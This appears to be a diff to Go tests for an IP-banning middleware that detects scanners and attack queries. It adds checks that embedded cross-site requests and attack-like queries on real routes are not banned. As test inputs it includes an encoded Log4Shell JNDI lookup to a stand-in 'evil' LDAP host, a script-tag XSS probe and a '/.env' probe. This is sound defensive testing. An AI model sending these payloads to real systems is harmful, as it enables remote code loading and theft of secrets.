@@ -28,7 +28,7 @@ func newBannerRouter(opts middleware.BannerOptions) (*gin.Engine, *fakeNotifier)
 
 func baseBannerOptions() middleware.BannerOptions {
 	return middleware.BannerOptions{
-		Cache:        cache.NewMemoryCache[int64](),
+		Cache:        cache.NewMemory[int64](cache.MemoryOptions{}),
 		MaxStrikes:   3,
 		StrikeWindow: time.Minute,
 		BanDurations: []time.Duration{time.Minute, time.Hour},
@@ -210,8 +210,42 @@ func TestBanner_BansScannerAgentAndAttackQuery(t *testing.T) {
 	}
 
 	// %24%7Bjndi: is ${jndi: encoded, as scanners send it.
-	if w := get(router, "/ok?x=%24%7Bjndi:ldap://evil/a%7D", "203.0.113.2:1"); w.Code != http.StatusForbidden {
-		t.Errorf("encoded Log4Shell query = %d, want 403", w.Code)
+	if w := get(router, "/missing?x=%24%7Bjndi:ldap://evil/a%7D", "203.0.113.2:1"); w.Code != http.StatusForbidden {
+		t.Errorf("encoded Log4Shell query on an unmatched path = %d, want 403", w.Code)
+	}
+}
+
+func TestBanner_AttackQueryOnARealRouteIsNotBanned(t *testing.T) {
+	router, _ := newBannerRouter(baseBannerOptions())
+
+	for range 2 {
+		if w := get(router, "/ok?q=%3Cscript%3E", "203.0.113.1:1"); w.Code != http.StatusOK {
+			t.Fatalf("attack-like query on a real route = %d, want 200", w.Code)
+		}
+	}
+}
+
+func TestBanner_CrossSiteNoCORSNeverBansOrStrikes(t *testing.T) {
+	router, _ := newBannerRouter(baseBannerOptions())
+	embedded := func(path string) int {
+		r := httptest.NewRequest(http.MethodGet, path, nil)
+		r.RemoteAddr = "203.0.113.1:1"
+		r.Header.Set("Sec-Fetch-Site", "cross-site")
+		r.Header.Set("Sec-Fetch-Mode", "no-cors")
+		w := httptest.NewRecorder()
+		router.ServeHTTP(w, r)
+
+		return w.Code
+	}
+
+	for _, path := range []string{"/.env", "/x?q=<script", "/missing", "/missing", "/missing", "/missing"} {
+		if code := embedded(path); code != http.StatusNotFound {
+			t.Fatalf("embedded %s = %d, want 404", path, code)
+		}
+	}
+
+	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusOK {
+		t.Fatalf("visitor after embedded requests = %d, want 200 (not banned)", w.Code)
 	}
 }
 
